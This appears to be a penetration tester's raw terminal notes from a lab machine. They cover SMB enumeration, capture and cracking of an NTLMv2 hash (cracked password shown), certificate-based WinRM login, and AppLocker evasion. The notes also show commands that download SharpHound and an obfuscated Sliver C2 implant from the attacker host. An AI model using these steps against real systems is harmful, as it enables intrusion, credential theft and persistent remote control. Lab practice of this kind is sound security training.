@@ -1,0 +1,234 @@
+
+
+nothing in ftp
+
+┌──(root㉿kali)-[/home/kali]
+└─# smbclient -N -L \\10.10.10.103 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	CertEnroll      Disk      Active Directory Certificate Services share
+	Department Shares Disk      
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	Operations      Disk      
+	SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.10.103 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+http://10.10.10.103/certenroll/ (403)
+http://10.10.10.103/certsrv/ (requires login)
+https://learn.microsoft.com/en-us/archive/technet-wiki/7734.certificate-enrollment-web-services-in-active-directory-certificate-services
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ./find_smb_writable.sh -H 10.10.10.103
+🔍 SMB Writable Share Scanner
+Host: 10.10.10.103
+
+Enumerating shares...
+Shares found: 7
+
+🔍 SCANNING FOR WRITABLE LOCATIONS...
+======================================
+✅ Department Shares/Users/Public
+✅ Department Shares/ZZ_ARCHIVE
+
+✅ SCAN COMPLETE!
+
+🎯 Found 2 writable location(s)
+📄 Full details saved to: ./writable_shares.csv
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+┌──(root㉿kali)-[/home/kali]
+└─# responder -I tun0
+
+[+] Listening for events...
+
+[SMB] NTLMv2-SSP Client   : 10.10.10.103
+[SMB] NTLMv2-SSP Username : HTB\amanda
+[SMB] NTLMv2-SSP Hash     : amanda::HTB:f97a38d724fc38a5:2C504001A45C828330BCE63A15BC7D0D:01010000000000008098DF93372CDC015C9065C97DA0E1B60000000002000800570035005A00350001001E00570049004E002D003800550033005100520032005400470054004F005A0004003400570049004E002D003800550033005100520032005400470054004F005A002E00570035005A0035002E004C004F00430041004C0003001400570035005A0035002E004C004F00430041004C0005001400570035005A0035002E004C004F00430041004C00070008008098DF93372CDC0106000400020000000800300030000000000000000100000000200000B335C7E5462B15D20823BF4DE7C2B06B805062C47CF93DAAC934924B55CE0F580A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003900000000000000000000000000
+
+┌──(root㉿kali)-[/home/kali]
+└─# echo 'amanda::HTB:f97a38d724fc38a5:2C504001A45C828330BCE63A15BC7D0D:01010000000000008098DF93372CDC015C9065C97DA0E1B60000000002000800570035005A00350001001E00570049004E002D003800550033005100520032005400470054004F005A0004003400570049004E002D003800550033005100520032005400470054004F005A002E00570035005A0035002E004C004F00430041004C0003001400570035005A0035002E004C004F00430041004C0005001400570035005A0035002E004C004F00430041004C00070008008098DF93372CDC0106000400020000000800300030000000000000000100000000200000B335C7E5462B15D20823BF4DE7C2B06B805062C47CF93DAAC934924B55CE0F580A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003900000000000000000000000000' > hash
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Ashare1972       (amanda)     
+1g 0:00:00:05 DONE (2025-09-23 04:17) 0.1897g/s 2166Kp/s 2166Kc/s 2166KC/s Ashiah08..Armani3
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+now we can sign in to 
+http://10.10.10.103/certsrv/
+
+┌──(root㉿kali)-[/home/kali]
+└─# openssl genrsa -des3 -out amanda.key 2048
+Enter PEM pass phrase:
+Verifying - Enter PEM pass phrase:
+                                                                                                                    
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# openssl req -new -key amanda.key -out amanda.csr
+Enter pass phrase for amanda.key:
+You are about to be asked to enter information that will be incorporated
+into your certificate request.
+What you are about to enter is what is called a Distinguished Name or a DN.
+There are quite a few fields but you can leave some blank
+For some fields there will be a default value,
+If you enter '.', the field will be left blank.
+-----
+Country Name (2 letter code) [AU]:
+State or Province Name (full name) [Some-State]:
+Locality Name (eg, city) []:
+Organization Name (eg, company) [Internet Widgits Pty Ltd]:
+Organizational Unit Name (eg, section) []:
+Common Name (e.g. server FQDN or YOUR name) []:
+Email Address []:
+
+Please enter the following 'extra' attributes
+to be sent with your certificate request
+A challenge password []:
+An optional company name []:
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+┌──(root㉿kali)-[/home/kali]
+└─# openssl rsa -in amanda.key -out amanda_nopass.key
+Enter pass phrase for amanda.key:
+writing RSA key
+                       
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# evil-winrm -i 10.10.10.103 -u amanda -c Downloads/certnew.cer -k amanda_nopass.key -S
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Warning: SSL enabled
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\amanda\Documents> 
+
+                                        
+Warning: Press "y" to exit, press any other key to continue
+                                        
+Info: Exiting...
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# evil-winrm -i 10.10.10.103 -u amanda -c Downloads/certnew.cer -k amanda.key -S       
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Warning: SSL enabled
+                                        
+Info: Establishing connection to remote endpoint
+Enter PEM pass phrase:
+*Evil-WinRM* PS C:\Users\amanda\Documents> 
+
+
+We are unable to use certutil
+
+┌──(root㉿kali)-[/home/kali]
+└─# python3 -m http.server 8080 --directory /usr/share/sharphound
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+10.10.10.103 - - [23/Sep/2025 05:58:55] "GET /SharpHound.exe HTTP/1.1" 200 -
+
+
+*Evil-WinRM* PS C:\Users\amanda\Documents> Invoke-WebRequest -Uri "http://10.10.14.9:8080/SharpHound.exe" -OutFile "SharpHound.exe"
+*Evil-WinRM* PS C:\Users\amanda\Documents> 
+
+
+
+*Evil-WinRM* PS C:\Users\amanda\Documents> # Copy to a directory that's often whitelisted by AppLocker
+copy SharpHound.exe C:\Windows\System32\spool\drivers\color\SharpHound.exe
+C:\Windows\System32\spool\drivers\color\SharpHound.exe -c All --zip
+2025-09-23T06:04:33.9144197-04:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
+2025-09-23T06:04:33.9144197-04:00|ERROR|The .Net Runtime is not compatible with SharpHound. Please update to .Net 4.7.2.
+*Evil-WinRM* PS C:\Users\amanda\Documents> 
+
+
+*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> Import-Module .\SharpHound.ps1
+Importing *.ps1 files as modules is not allowed in ConstrainedLanguage mode.
+At line:1 char:1
++ Import-Module .\SharpHound.ps1
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (:) [Import-Module], InvalidOperationException
+    + FullyQualifiedErrorId : Modules_ImportPSFileNotAllowedInConstrainedLanguage,Microsoft.PowerShell.Commands.ImportModuleCommand
+*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> 
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# sliver
+Connecting to localhost:31337 ...
+
+    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
+    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
+    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
+    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
+    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
+    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
+
+All hackers gain conspire
+[*] Server v1.5.43 - e116a5ec3d26e8582348a29cfd251f915ce4a405
+[*] Welcome to the sliver shell, please type 'help' for options
+
+[*] Check for updates with the 'update' command
+
+sliver > generate --mtls 10.10.14.9 --os windows --arch amd64 --format exe --save /tmp/sliver.exe
+
+[*] Generating new windows/amd64 implant binary
+[*] Symbol obfuscation is enabled
+[*] Build completed in 49s
+[*] Implant saved to /tmp/sliver.exe
+
+sliver > mtls --lport 443
+
+[*] Starting mTLS listener ...
+
+[*] Successfully started job #1
+
+sliver >  
+
+
+*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> Invoke-WebRequest -Uri "http://10.10.14.9:8080/sliver.exe" -OutFile "sliver.exe"
+*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
